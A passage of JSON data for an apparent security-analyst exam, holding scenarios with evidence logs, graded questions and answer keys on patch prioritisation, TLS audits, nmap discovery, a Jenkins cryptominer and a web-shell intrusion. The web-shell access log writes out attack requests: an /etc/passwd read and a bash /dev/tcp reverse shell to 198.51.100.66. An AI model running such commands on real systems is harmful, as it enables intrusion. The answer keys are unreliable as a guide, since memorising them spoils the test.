supported release. The vendor no longer\n              publishes security updates for the installed version.\n\nF3  172.16.40.12   OpenSSH &lt; 9.8p1 Signal Handler Race (CVE-2024-6387)\n    Severity: High     CVSS v3.1: 8.1\n    Solution: Upgrade OpenSSH to 9.8p1 or later.\n\nF4  172.16.30.8    Jenkins CLI Arbitrary File Read (CVE-2024-23897)\n    Severity: Critical CVSS v3.1: 9.8\n    Solution: Upgrade Jenkins to a fixed release.\n\nF5  172.16.10.30   Apache HTTP Server 2.4.50 Path Traversal and RCE\n                   (CVE-2021-42013)\n    Severity: Critical CVSS v3.1: 9.8\n    Solution: Upgrade Apache HTTP Server to 2.4.51 or later."}],"q":[{"k":"text","o":"2.5","p":"F1 — deadline in days","a":["15"],"ph":"days","w":"Medium in production is 30 days. 172.16.10.15 is in prod-edge, which is internet-facing, so the deadline halves to 15.","show":"15"},{"k":"text","o":"2.5","p":"F2 — deadline in days","a":["14"],"ph":"days","w":"High in production is 14 days. prod-core is not internet-facing, so no halving. The lack of a patch does not extend the deadline; it changes what has to happen inside it.","show":"14"},{"k":"text","o":"2.5","p":"F3 — deadline in days","a":["30"],"ph":"days","w":"High in non-production is 30 days. 172.16.40.12 is in dev. The finding is serious, but the standard prices in that dev is not where customer data or revenue lives.","show":"30"},{"k":"text","o":"2.5","p":"F4 — deadline in days","a":["21"],"ph":"days","w":"Critical in non-production is 21 days. 172.16.30.8 is staging. A 9.8 on an internal build server is still a fast-moving item, because build servers hold credentials for production.","show":"21"},{"k":"text","o":"2.5","p":"F5 — deadline in days","a":["3"],"ph":"days","w":"Critical in production is 7 days; prod-edge halves it to 3.5, and the rule rounds down to 3. An internet-facing path traversal with a public exploit is the finding attackers will reach first.","show":"3"},{"k":"select","o":"2.3","p":"Which finding goes to the top of the queue?","opt":["F5","F4","F2","F3"],"a":0,"fx":false,"w":"F4 and F5 share a 9.8 base score, so the score alone does not break the tie. Exposure does: F5 is reachable from the internet with a well-known exploit, and it has the shortest deadline in the batch."},{"k":"select","o":"2.5","p":"F2 has no vendor fix for its installed version. What is the right plan?","opt":["Schedule the upgrade to a supported release; until then, restrict the host to its application servers with a firewall rule and file a risk exception","Apply the latest cumulative update for the installed version","Accept the risk without an exception, because the host is not internet-facing","Block TCP 443 to the host at the perimeter firewall"],"a":0,"fx":false,"w":"With no patch to apply, the standard requires a compensating control inside the same 14 days plus an exception the CISO owns. Narrowing who can reach the database reduces exposure while the upgrade is planned. There are no updates left to install, internal does not mean exempt, and 443 is not the database&#x27;s port."},{"k":"select","o":"2.3","p":"The change board asks why F4 (9.8) gets 21 days when F2 (7.5) gets 14. What is the best answer?","opt":["The base score measures the flaw itself; the standard adjusts priority for where the asset sits, which is the same idea as CVSS environmental metrics","The scanner scored F4 incorrectly and it should be re-rated as High","Non-production findings do not count toward risk","Critical findings are always scheduled after High findings"],"a":0,"fx":false,"w":"CVSS base metrics describe the vulnerability in isolation. How much it matters to this organization depends on asset criticality and exposure, which CVSS models in its environmental group and this standard models with the production split. Nothing says the score is wrong, and non-production risk still counts, just on a longer clock."},{"k":"select","o":"2.5","p":"The web team reports F5 patched. When can the finding be closed?","opt":["When a follow-up scan of 172.16.10.30 no longer reports it","When the change ticket is marked complete","When the patch management console shows the update as installed","When the vendor advisory is attached to the ticket"],"a":0,"fx":false,"w":"Validation is part of remediation. A rescan confirms the vulnerable version is actually gone from the listening service, which catches the common failures: the wrong host patched, a service never restarted, or a second instance still running the old build."}]},{"id":"tls-baseline","obj":"2.2","objs":["2.2","2.4"],"pts":9,"title":"Web Tier Baseline Audit","sc":"You are verifying four public web servers against the hardening baseline before a compliance review. A colleague collected a header check and a TLS enumeration from each server.","task":"Part 1: tick each requirement the server meets. Part 2: choose the change that brings each server into compliance.","ev":[{"k":"doc","l":"Baseline","f":[],"p":["1. Only TLS 1.2 and TLS 1.3 may be offered.","2. The web server must run the approved build: nginx/1.26.2.","3. Every HTTPS response must carry a Strict-Transport-Security header."]},{"k":"log","l":"web01","c":"$ curl -sI https://web01.harborline.example","b":"HTTP/1.1 200 OK\nServer: nginx/1.26.2\nDate: Sun, 25 Oct 2026 18:04:12 GMT\nContent-Type: text/html; charset=utf-8\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff\n\n$ nmap --script ssl-enum-ciphers -p 443 web01.harborline.example\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-enum-ciphers:\n|   TLSv1.2:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (secp256r1) - A\n|     cipher preference: server\n|   TLSv1.3:\n|     ciphers:\n|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A\n|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A\n|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A\n|     cipher preference: server\n|_  least strength: A"},{"k":"log","l":"web02","c":"$ curl -sI https://web02.harborline.example","b":"HTTP/1.1 200 OK\nServer: nginx/1.26.2\nDate: Sun, 25 Oct 2026 18:04:19 GMT\nContent-Type: text/html; charset=utf-8\nX-Content-Type-Options: nosniff\n\n$ nmap --script ssl-enum-ciphers -p 443 web02.harborline.example\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-enum-ciphers:\n|   TLSv1.0:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A\n|     cipher preference: server\n|   TLSv1.2:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|     cipher preference: server\n|_  least strength: A"},{"k":"log","l":"web03","c":"$ curl -sI https://web03.harborline.example","b":"HTTP/1.1 200 OK\nServer: nginx/1.22.1\nDate: Sun, 25 Oct 2026 18:04:25 GMT\nContent-Type: text/html; charset=utf-8\nStrict-Transport-Security: max-age=31536000\nX-Content-Type-Options: nosniff\n\n$ nmap --script ssl-enum-ciphers -p 443 web03.harborline.example\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-enum-ciphers:\n|   TLSv1.2:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|     cipher preference: server\n|   TLSv1.3:\n|     ciphers:\n|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A\n|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A\n|     cipher preference: server\n|_  least strength: A"},{"k":"log","l":"web04","c":"$ curl -sI https://web04.harborline.example","b":"HTTP/1.1 200 OK\nServer: nginx/1.26.2\nDate: Sun, 25 Oct 2026 18:04:31 GMT\nContent-Type: text/html; charset=utf-8\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload\nX-Content-Type-Options: nosniff\n\n$ nmap --script ssl-enum-ciphers -p 443 web04.harborline.example\nPORT    STATE SERVICE\n443/tcp open  https\n| ssl-enum-ciphers:\n|   TLSv1.1:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A\n|     cipher preference: server\n|   TLSv1.2:\n|     ciphers:\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|     cipher preference: server\n|   TLSv1.3:\n|     ciphers:\n|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A\n|     cipher preference: server\n|_  least strength: A"}],"q":[{"k":"grid","o":"2.2","p":"Part 1 — tick each requirement the server meets.","rows":["web01","web02","web03","web04"],"cols":["TLS 1.2/1.3 only","Approved nginx build","HSTS header"],"a":[[true,true,true],[false,true,false],[true,false,true],[false,true,true]],"rw":["Compliant on all three: only TLSv1.2 and TLSv1.3 sections, nginx/1.26.2, and an HSTS header.","Offers TLSv1.0 and sends no Strict-Transport-Security header. The build is correct. Note that every cipher is graded A; a strong cipher does not make a deprecated protocol version acceptable.","TLS and HSTS are fine, but the Server header reports nginx/1.22.1, an older build than the baseline allows.","Build and HSTS are fine, but a TLSv1.1 section is present. One extra protocol section is all it takes to fail the requirement."]},{"k":"match","o":"2.4","p":"Part 2 — choose the change each server needs.","ch":["No change required","Upgrade nginx to the approved 1.26.2 build","Limit ssl_protocols to TLSv1.2 TLSv1.3","Limit ssl_protocols to TLSv1.2 TLSv1.3 and add the HSTS header","Replace the certificate with one from a public CA"],"it":[{"t":"web01","a":0,"w":"Already meets the baseline. Recommending changes to a compliant server costs change-window time and adds risk for no gain."},{"t":"web02","a":3,"w":"Two failures, so the fix has to cover both. Fixing the protocol list alone leaves the header missing."},{"t":"web03","a":1,"w":"The only failure is the version string. Nothing in the evidence points at the certificate, so replacing it would not move the audit."},{"t":"web04","a":2,"w":"Remove TLSv1.1 from the configuration. HSTS is already present with a long max-age, so the narrower change is the right one."}],"sh":false},{"k":"select","o":"2.2","p":"Which collected output could prove web02 offers TLS 1.0?","opt":["The nmap ssl-enum-ciphers output","The curl -sI header output","Either one","Neither; you would need a packet capture"],"a":0,"fx":false,"w":"curl -I negotiates one connection at the best version both sides support and reports headers, so it never reveals what else the server would accept. ssl-enum-ciphers tries each protocol version in turn and lists the ones that succeed, which is exactly the question."}]},{"id":"port-recon","obj":"2.2","objs":["2.2"],"pts":15,"title":"Service Discovery with Nmap","sc":"Five servers on the 10.40.8.0/24 segment arrived from an acquisition with no documentation beyond their DNS names. Before they join the main network, you need to know what each one does and whether it breaks the cleartext services policy.","task":"Scan each host from the console (type help for usage). For every server, record its role, its IP address and the port that breaks policy.","ev":[{"k":"terminal","l":"Console","pr":"analyst@scanbox:~$","bn":"Hosts to scan: srv1.hq.lab  srv2.hq.lab  srv3.hq.lab  srv4.hq.lab  srv5.hq.lab\nType help for usage.","hp":"usage: nmap [options] &lt;host&gt;\n  e.g. nmap -sV -sC srv1.hq.lab\nother commands: help, clear, hosts","cm":[{"m":["^nmap(\\s+\\S+)*\\s+(srv1(\\.hq\\.lab)?|10\\.40\\.8\\.21)(\\s+\\S+)*$"],"o":"Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 14:02 EDT\nNmap scan report for srv1.hq.lab (10.40.8.21)\nHost is up (0.00038s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT    STATE SERVICE       VERSION\n21/tcp  open  ftp           Microsoft ftpd\n| ftp-syst:\n|_  SYST: Windows_NT\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.42 seconds"},{"m":["^nmap(\\s+\\S+)*\\s+(srv2(\\.hq\\.lab)?|10\\.40\\.8\\.33)(\\s+\\S+)*$"],"o":"Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 14:02 EDT\nNmap scan report for srv2.hq.lab (10.40.8.33)\nHost is up (0.00038s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\n23/tcp   open  telnet     Linux telnetd\n5432/tcp open  postgresql PostgreSQL DB 16.3 - 16.4\n| ssl-cert: Subject: commonName=srv2.hq.lab\n|_Not valid after:  2027-04-02T11:20:13\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.42 seconds"},{"m":["^nmap(\\s+\\S+)*\\s+(srv3(\\.hq\\.lab)?|10\\.40\\.8\\.2)(\\s+\\S+)*$"],"o":"Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 14:02 EDT\nNmap scan report for srv3.hq.lab (10.40.8.2)\nHost is up (0.00038s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      Cisco SSH 1.25 (protocol 2.0)\n80/tcp  open  http     Cisco IOS http config\n|_http-title: Site doesn&#x27;t have a title (text/html).\n| http-auth:\n|_  Basic realm=level_15_access\n443/tcp open  ssl/http Cisco IOS https config\nService Info: OS: IOS; Device: switch; CPE: cpe:/o:cisco:ios\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.42 seconds"},{"m":["^nmap(\\s+\\S+)*\\s+(srv4(\\.hq\\.lab)?|10\\.40\\.8\\.47)(\\s+\\S+)*$"],"o":"Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 14:02 EDT\nNmap scan report for srv4.hq.lab (10.40.8.47)\nHost is up (0.00038s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT    STATE SERVICE    VERSION\n25/tcp  open  smtp       Postfix smtpd\n|_smtp-commands: srv4.hq.lab, PIPELINING, SIZE 52428800, STARTTLS, ENHANCEDSTATUSCODES\n110/tcp open  pop3       Dovecot pop3d\n587/tcp open  smtp       Postfix smtpd\n993/tcp open  ssl/imap   Dovecot imapd\nService Info: Host:  srv4.hq.lab\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.42 seconds"},{"m":["^nmap(\\s+\\S+)*\\s+(srv5(\\.hq\\.lab)?|10\\.40\\.8\\.50)(\\s+\\S+)*$"],"o":"Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 14:02 EDT\nNmap scan report for srv5.hq.lab (10.40.8.50)\nHost is up (0.00038s latency).\nNot shown: 995 closed tcp ports (reset)\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http     nginx 1.26.2\n|_http-title: Did not follow redirect to https://srv5.hq.lab/\n443/tcp  open  ssl/http nginx 1.26.2\n|_http-title: Harborline Partner Portal\n8080/tcp open  http     Jetty 10.0.20\n|_http-title: Dashboard [Jenkins]\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.42 seconds"},{"m":["^hosts$"],"o":"srv1.hq.lab  srv2.hq.lab  srv3.hq.lab  srv4.hq.lab  srv5.hq.lab"}],"ms":[{"m":["^nmap\\b.*$"],"o":"Failed to resolve the target. Try one of: srv1.hq.lab, srv2.hq.lab, srv3.hq.lab, srv4.hq.lab, srv5.hq.lab\nWARNING: No targets were specified, so 0 hosts scanned."}]},{"k":"doc","l":"Policy","f":[],"p":["Prohibited services: Telnet (23), FTP (21), POP3 (110) and IMAP (143).","HTTP is allowed only on port 80, and only where it does nothing but redirect to HTTPS. HTTP on any other port, or a port 80 listener that serves content, is a violation.","Each server below has exactly one violation."]}],"q":[{"k":"select","o":"2.2","p":"srv1.hq.lab — role","opt":["Database server","File server","Mail server","Network switch","Web server"],"a":1,"fx":true,"w":"SMB on 445 with NetBIOS (139) and RPC (135) is a Windows file server. FTP on 21 sends credentials and files in cleartext, and the policy prohibits it."},{"k":"text","o":"2.2","p":"srv1.hq.lab — IP address","a":["10.40.8.21"],"ph":"10.40.8.x","w":"The scan report line resolves srv1.hq.lab to 10.40.8.21.","show":"10.40.8.21"},{"k":"text","o":"2.2","p":"srv1.hq.lab — non-compliant port","a":["21","21/tcp"],"ph":"port","w":"SMB on 445 with NetBIOS (139) and RPC (135) is a Windows file server. FTP on 21 sends credentials and files in cleartext, and the policy prohibits it.","show":"21"},{"k":"select","o":"2.2","p":"srv2.hq.lab — role","opt":["Database server","File server","Mail server","Network switch","Web server"],"a":0,"fx":true,"w":"PostgreSQL on 5432 makes this the database. SSH on 22 is fine; Telnet on 23 is cleartext remote administration and violates policy."},{"k":"text","o":"2.2","p":"srv2.hq.lab — IP address","a":["10.40.8.33"],"ph":"10.40.8.x","w":"The scan report line resolves srv2.hq.lab to 10.40.8.33.","show":"10.40.8.33"},{"k":"text","o":"2.2","p":"srv2.hq.lab — non-compliant port","a":["23","23/tcp"],"ph":"port","w":"PostgreSQL on 5432 makes this the database. SSH on 22 is fine; Telnet on 23 is cleartext remote administration and violates policy.","show":"23"},{"k":"select","o":"2.2","p":"srv3.hq.lab — role","opt":["Database server","File server","Mail server","Network switch","Web server"],"a":3,"fx":true,"w":"Cisco SSH and an IOS web config interface, with the device type reported as switch, at the .2 address of the segment. Port 80 serves the configuration page itself rather than redirecting, so management traffic and the admin password cross the wire in cleartext. The same port on srv5 is allowed because it only redirects."},{"k":"text","o":"2.2","p":"srv3.hq.lab — IP address","a":["10.40.8.2"],"ph":"10.40.8.x","w":"The scan report line resolves srv3.hq.lab to 10.40.8.2.","show":"10.40.8.2"},{"k":"text","o":"2.2","p":"srv3.hq.lab — non-compliant port","a":["80","80/tcp"],"ph":"port","w":"Cisco SSH and an IOS web config interface, with the device type reported as switch, at the .2 address of the segment. Port 80 serves the configuration page itself rather than redirecting, so management traffic and the admin password cross the wire in cleartext. The same port on srv5 is allowed because it only redirects.","show":"80"},{"k":"select","o":"2.2","p":"srv4.hq.lab — role","opt":["Database server","File server","Mail server","Network switch","Web server"],"a":2,"fx":true,"w":"SMTP on 25, submission on 587 and IMAPS on 993 make this the mail server. POP3 on 110 is the cleartext retrieval protocol and is prohibited; the secure IMAPS listener already covers clients."},{"k":"text","o":"2.2","p":"srv4.hq.lab — IP address","a":["10.40.8.47"],"ph":"10.40.8.x","w":"The scan report line resolves srv4.hq.lab to 10.40.8.47.","show":"10.40.8.47"},{"k":"text","o":"2.2","p":"srv4.hq.lab — non-compliant port","a":["110","110/tcp"],"ph":"port","w":"SMTP on 25, submission on 587 and IMAPS on 993 make this the mail server. POP3 on 110 is the cleartext retrieval protocol and is prohibited; the secure IMAPS listener already covers clients.","show":"110"},{"k":"select","o":"2.2","p":"srv5.hq.lab — role","opt":["Database server","File server","Mail server","Network switch","Web server"],"a":4,"fx":true,"w":"nginx on 443 makes this the web server, and port 80 only redirects to HTTPS, which the policy allows. Port 8080 serves a Jenkins dashboard over plain HTTP, which is HTTP on a non-80 port and a violation."},{"k":"text","o":"2.2","p":"srv5.hq.lab — IP address","a":["10.40.8.50"],"ph":"10.40.8.x","w":"The scan report line resolves srv5.hq.lab to 10.40.8.50.","show":"10.40.8.50"},{"k":"text","o":"2.2","p":"srv5.hq.lab — non-compliant port","a":["8080","8080/tcp"],"ph":"port","w":"nginx on 443 makes this the web server, and port 80 only redirects to HTTPS, which the policy allows. Port 8080 serves a Jenkins dashboard over plain HTTP, which is HTTP on a non-80 port and a violation.","show":"8080"}]},{"id":"build-server","obj":"1.2","objs":["1.2","3.2"],"pts":5,"title":"Ticket: The Slow Build Server","sc":"A help-desk ticket landed in the SOC queue because the infrastructure team has run out of ideas. Builds on the shared CI server have slowed to a crawl. The ticket, the server&#x27;s details, the recent change log and two command outputs are attached.","task":"Find the cause, separate it from the change that looks guilty, and decide what happens next.","ev":[{"k":"doc","l":"Ticket","f":[["Ticket","INC-48113"],["Priority","High"],["Opened","Thu 2026-10-22 09:05"],["Reported by","D. Okafor, Release Engineering"],["Asset","ci-build01 (10.30.2.40), Ubuntu 24.04, 16 vCPU, 32 GB RAM"]],"p":["Builds that took 12 minutes on Monday now take 40 or more, and two nightly jobs timed out. Infrastructure checked the storage array and the network: no errors, normal throughput.","Most of the team blames Monday&#x27;s kernel patch and wants to roll it back tonight. Please confirm before we do."]},{"k":"table","l":"Change log","cap":"","m":false,"h":["When","Who","Change"],"r":[["Mon 10-19 22:10","mfarid (sysadmin)","Kernel and OpenSSL security updates applied; host rebooted"],["Tue 10-20 10:30","D. Okafor","Build times normal (12 min) on the morning release"],["Tue 10-20 13:52","pvance (developer)","Installed Jenkins plugin &quot;fast-artifact-cache&quot; from a direct download link shared in a forum"],["Tue 10-20 14:40","D. Okafor","First slow build reported (31 min)"],["Wed 10-21 03:00","scheduler","Nightly integration job timed out"]]},{"k":"log","l":"top","c":"mfarid@ci-build01:~$ top -b -n1 | head -14","b":"top - 09:41:07 up 2 days, 11:31,  1 user,  load average: 15.82, 15.61, 15.40\nTasks: 214 total,   2 running, 212 sleeping,   0 stopped,   0 zombie\n%Cpu(s): 97.8 us,  1.4 sy,  0.0 ni,  0.6 id,  0.0 wa,  0.0 hi,  0.2 si,  0.0 st\nMiB Mem :  32041.3 total,  18220.4 free,   9310.7 used,   4510.2 buff/cache\nMiB Swap:   4096.0 total,   4096.0 free,      0.0 used.  22730.6 avail Mem\n\n    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n  48211 jenkins   20   0 2471208   2.1g   3144 S  1532  6.7  3712:45 .syslogd\n   1407 jenkins   20   0   10.4g   3.9g  41212 S  22.1 12.4  88:10.31 java\n    911 root      20   0  210992  12804   9216 S   0.3  0.0   1:02.17 systemd-journal\n      1 root      20   0  167808  13180   8452 S   0.0  0.0   0:07.40 systemd"},{"k":"log","l":"ss / proc","c":"mfarid@ci-build01:~$ sudo ss -tnp state established","b":"Recv-Q Send-Q   Local Address:Port      Peer Address:Port  Process\n0      0          10.30.2.40:22         10.30.0.15:51120  users:((&quot;sshd&quot;,pid=50102,fd=4))\n0      0          10.30.2.40:8080       10.30.5.88:61944  users:((&quot;java&quot;,pid=1407,fd=211))\n0      0          10.30.2.40:44718    203.0.113.140:3333   users:((&quot;\\.syslogd&quot;,pid=48211,fd=12))\n\nmfarid@ci-build01:~$ sudo ls -l /proc/48211/exe\nlrwxrwxrwx 1 jenkins jenkins 0 Oct 22 09:41 /proc/48211/exe -&gt; /var/lib/jenkins/.cache/.x/.syslogd"}],"q":[{"k":"select","o":"1.2","p":"What is the most likely cause of the slowdown?","opt":["An unauthorized cryptocurrency miner running as the jenkins user","Monday&#x27;s kernel update degrading scheduler performance","A failing disk in the storage array","Network saturation between the build server and the artifact store"],"a":0,"fx":false,"w":"One process owned by jenkins is using about fifteen cores (1532% CPU) under a name that imitates a system daemon, from a hidden directory in the jenkins home, while holding a connection to port 3333 on an outside address. Sustained maximum CPU plus an outbound pool connection is the profile of a miner. Storage and network were already checked clean."},{"k":"select","o":"1.2","p":"Which evidence rules out the kernel patch?","opt":["Builds were normal Tuesday morning, after the patch, and slowed only after the plugin install that afternoon","The kernel patch was applied by a sysadmin, so it was authorized","Memory usage is below 50%","The server has been up for more than a day"],"a":0,"fx":false,"w":"Correlate the timeline. If the patch were the cause, Tuesday&#x27;s 10:30 build would have been slow too. The first slow build follows the plugin install by under an hour. Rolling back a security patch on a hunch would have reopened known vulnerabilities and fixed nothing."},{"k":"text","o":"1.2","p":"Which remote port is the suspicious process connected to?","a":["3333"],"ph":"port","w":"Port 3333 is widely used for Stratum, the protocol miners speak to mining pools. A port number is a lead, not proof, but together with the CPU profile it is a strong one.","show":"3333"},{"k":"select","o":"1.2","p":"Whose activity should be reviewed first?","opt":["pvance, who installed the plugin from a forum link","mfarid, who applied the kernel update","D. Okafor, who opened the ticket","The scheduler account that runs nightly jobs"],"a":0,"fx":false,"w":"The binary lives in the jenkins service account&#x27;s cache, and the only change that ran code as jenkins in the window was the third-party plugin. This is a review of how it got in, not an accusation: an unvetted plugin from a direct link bypasses the update center&#x27;s checks."},{"k":"select","o":"3.2","p":"What is the right next step?","opt":["Contain ci-build01, preserve the binary and process memory, then rotate every credential Jenkins stores","Roll back the kernel update tonight as the team proposed","Kill PID 48211 and close the ticket as resolved","Add CPU to the virtual machine so builds finish on time"],"a":0,"fx":false,"w":"A miner is the visible payload, but the plugin gave an outsider code execution as jenkins, and a build server holds deploy keys, repository tokens and cloud credentials. Contain it, keep evidence, and assume those secrets are exposed. Killing the process leaves the plugin in place to start it again."}]},{"id":"after-hours","obj":"1.2","objs":["1.2","3.2"],"pts":5,"title":"After-Hours Upload","sc":"The web content team publishes pages to web01 (10.20.1.15) over SSH from the office network, 10.10.5.0/24, during business hours. The overnight on-call analyst saw a new outbound connection from web01 at 02:20 and pulled three sources.","task":"Identify the address of concern and the indicator of compromise, then choose the corrective actions.","ev":[{"k":"log","l":"auth.log","c":"/var/log/auth.log (excerpt)","b":"Oct 20 09:12:44 web01 sshd[2188]: Accepted publickey for webdev from 10.10.5.23 port 61790 ssh2: ED25519 SHA256:q3Lw...\nOct 20 17:30:02 web01 sshd[2188]: pam_unix(sshd:session): session closed for user webdev\nOct 21 02:10:01 web01 sshd[30411]: Failed password for webdev from 198.51.100.66 port 50122 ssh2\nOct 21 02:10:04 web01 sshd[30411]: Failed password for webdev from 198.51.100.66 port 50122 ssh2\nOct 21 02:10:09 web01 sshd[30414]: Failed password for webdev from 198.51.100.66 port 50130 ssh2\n  ... 212 similar lines from 198.51.100.66 between 02:10:09 and 02:13:58 ...\nOct 21 02:14:02 web01 sshd[30580]: Accepted password for webdev from 198.51.100.66 port 50391 ssh2\nOct 21 02:14:02 web01 sshd[30580]: pam_unix(sshd:session): session opened for user webdev\nOct 21 02:15:30 web01 sftp-server[30588]: open &quot;/var/www/html/uploads/thumb.php&quot; flags WRITE,CREATE,TRUNCATE mode 0644\nOct 21 02:15:31 web01 sftp-server[30588]: close &quot;/var/www/html/uploads/thumb.php&quot; bytes read 0 written 1214\nOct 21 02:16:05 web01 sshd[30580]: pam_unix(sshd:session): session closed for user webdev"},{"k":"log","l":"access.log","c":"/var/log/nginx/access.log (excerpt)","b":"10.10.5.23 - - [20/Oct/2026:09:20:11 +0000] &quot;GET /about.html HTTP/1.1&quot; 200 8812 &quot;-&quot; &quot;Mozilla/5.0&quot;\n192.0.2.44 - - [21/Oct/2026:01:58:12 +0000] &quot;GET /wp-admin/ HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;\n192.0.2.44 - - [21/Oct/2026:01:58:12 +0000] &quot;GET /.env HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;\n192.0.2.44 - - [21/Oct/2026:01:58:13 +0000] &quot;GET /phpmyadmin/ HTTP/1.1&quot; 404 153 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;\n198.51.100.66 - - [21/Oct/2026:02:17:11 +0000] &quot;GET /uploads/thumb.php?c=id HTTP/1.1&quot; 200 54 &quot;-&quot; &quot;curl/8.5.0&quot;\n198.51.100.66 - - [21/Oct/2026:02:17:40 +0000] &quot;GET /uploads/thumb.php?c=cat%20/etc/passwd HTTP/1.1&quot; 200 1844 &quot;-&quot; &quot;curl/8.5.0&quot;\n198.51.100.66 - - [21/Oct/2026:02:19:58 +0000] &quot;GET /uploads/thumb.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/198.51.100.66/4443%200%3E%261%27 HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/8.5.0&quot;"},{"k":"log","l":"ss","c":"root@web01:~# ss -tnp state established","b":"Recv-Q Send-Q   Local Address:Port     Peer Address:Port   Process\n0      0          10.20.1.15:22        10.30.0.15:51120   users:((&quot;sshd&quot;,pid=31002,fd=4))\n0      0          10.20.1.15:443       10.10.5.40:52011   users:((&quot;nginx&quot;,pid=1180,fd=12))\n0      0          10.20.1.15:51022  198.51.100.66:4443    users:((&quot;bash&quot;,pid=30791,fd=3))"}],"q":[{"k":"select","o":"1.2","p":"Which source IP should the analyst be concerned about?","opt":["198.51.100.66","192.0.2.44","10.10.5.23","10.30.0.15"],"a":0,"fx":false,"w":"198.51.100.66 guessed the webdev password, logged in, wrote a file into the web root and then drove it from the browser side. 192.0.2.44 is the noisiest address in the log, but every request it made returned 404: routine internet scanning that found nothing. 10.10.5.23 is the content team&#x27;s normal key-based login, and 10.30.0.15 is the on-call analyst&#x27;s own session."},{"k":"text","o":"1.2","p":"Which account was compromised?","a":["webdev"],"ph":"username","w":"The successful login at 02:14:02 is for webdev, and it used a password rather than the ED25519 key the team normally uses. The change of authentication method is itself an indicator.","show":"webdev"},{"k":"select","o":"1.2","p":"What is the indicator of compromise?","opt":["A password brute force that succeeded, followed by a PHP web shell uploaded and executed","Scanning for /wp-admin and /.env that returned 404","A key-based SSH login from the office network","A large file served from /about.html"],"a":0,"fx":false,"w":"thumb.php in an uploads folder, fed shell commands through a c= parameter, is a web shell. The 200 response with 1844 bytes for /etc/passwd shows commands ran and returned output. The 404 scanning never succeeded."},{"k":"select","o":"1.2","p":"What does the third line of the ss output show?","opt":["A reverse shell from web01 back to the attacker on port 4443","An inbound SSH session from the attacker","The attacker downloading thumb.php","nginx serving a page to the attacker"],"a":0,"fx":false,"w":"web01 initiated the connection from an ephemeral port to the attacker&#x27;s port 4443, and the owning process is bash. That matches the last access-log request, which told the web shell to open an interactive shell back to 198.51.100.66."},{"k":"multi","o":"3.2","p":"Choose THREE corrective actions.","opt":["Disable SSH password authentication and require keys","Rotate the webdev credentials and remove thumb.php after imaging the host","Restrict SSH on web01 to the office subnet and VPN","Block 192.0.2.44 at the firewall","Raise nginx logging to debug level","Rename the uploads directory"],"a":[0,1,2],"w":"Each correct action closes a link in this chain: password auth let the guessing work, the account and the shell are the attacker&#x27;s current access, and SSH should never have been reachable from the internet. Image before removing the shell so the 